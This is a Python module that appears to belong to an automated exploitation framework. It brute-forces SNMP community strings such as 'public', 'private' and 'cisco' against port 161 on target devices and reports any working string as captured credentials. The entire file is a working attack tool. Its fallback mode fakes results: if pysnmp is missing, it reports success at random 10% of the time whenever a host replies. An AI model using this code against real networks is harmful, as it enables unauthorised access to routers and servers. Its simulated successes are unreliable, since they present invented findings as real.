"""
SNMP Exploit Module
Exploits SNMP (Simple Network Management Protocol) vulnerabilities
"""

import socket
from typing import Dict, Tuple

import sys
import os
sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from exploits.exploit_manager import BaseExploit
from utils.logger import logger


class SNMP_Exploit(BaseExploit):
    """
    SNMP Community String Brute Force
    Targets: Network devices with SNMP (port 161)
    """
    
    def __init__(self):
        super().__init__(
            name="SNMP_BruteForce",
            target_ports=[161, 162],
            target_os=["Network Device", "Windows", "Linux"]
        )
        
        self.snmp_communities = [
            "public",
            "private",
            "community",
            "admin",
            "cisco",
            "manager",
            "snmp",
        ]
    
    def check_vulnerable(self, target: Dict) -> bool:
        """Check if SNMP is accessible"""
        ip = target['ip']
        
        if 161 not in target.get('open_ports', []):
            return False
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(3)
            sock.sendto(b"test", (ip, 161))
            sock.close()
            
            logger.debug(f"SNMP port accessible on {ip}")
            return True
        except Exception as e:
            logger.debug(f"SNMP check failed on {ip}: {e}")
        
        return False
    
    def exploit(self, target: Dict) -> Tuple[bool, Dict]:
        """Attempt SNMP community string brute force"""
        ip = target['ip']
        logger.info(f"Attempting SNMP brute force on {ip}")
        
        try:
            has_pysnmp = False
            try:
                import pysnmp
                has_pysnmp = True
            except ImportError:
                logger.warning("pysnmp not installed, using simulation")
            
            for community in self.snmp_communities:
                logger.debug(f"Trying SNMP community: {community}")
                
                if has_pysnmp:
                    success = self._try_snmp_access_real(ip, community)
                else:
                    success = self._try_snmp_access_sim(ip, community)
                
                if success:
                    self.stats['success'] += 1
                    logger.success(f"SNMP access gained on {ip} with community: {community}")
                    
                    return True, {
                        'method': 'SNMP_BruteForce',
                        'credentials': f"community:{community}",
                        'port': 161,
                        'service': 'SNMP'
                    }
            
            self.stats['failure'] += 1
            return False, {}
            
        except Exception as e:
            self.stats['failure'] += 1
            logger.error(f"SNMP exploit error on {ip}: {e}")
            return False, {}
    
    def _try_snmp_access_real(self, ip: str, community: str) -> bool:
        """Try real SNMP access"""
        try:
            from pysnmp.hlapi import (
                getCmd, SnmpEngine, CommunityData, 
                UdpTransportTarget, ContextData, 
                ObjectType, ObjectIdentity
            )
            
            iterator = getCmd(
                SnmpEngine(),
                CommunityData(community),
                UdpTransportTarget((ip, 161), timeout=2, retries=0),
                ContextData(),
                ObjectType(ObjectIdentity('SNMPv2-MIB', 'sysDescr', 0))
            )
            
            errorIndication, errorStatus, errorIndex, varBinds = next(iterator)
            
            if errorIndication or errorStatus:
                return False
            
            return True
            
        except:
            return False
    
    def _try_snmp_access_sim(self, ip: str, community: str) -> bool:
        """Simulate SNMP access"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2)
            
            # Send dummy SNMP packet
            sock.sendto(b"SNMP", (ip, 161))
            
            try:
                sock.recvfrom(1024)
                sock.close()
                
                # Simulate 10% success rate
                import random
                return random.random() < 0.10
            except socket.timeout:
                sock.close()
                return False
            
        except:
            return False
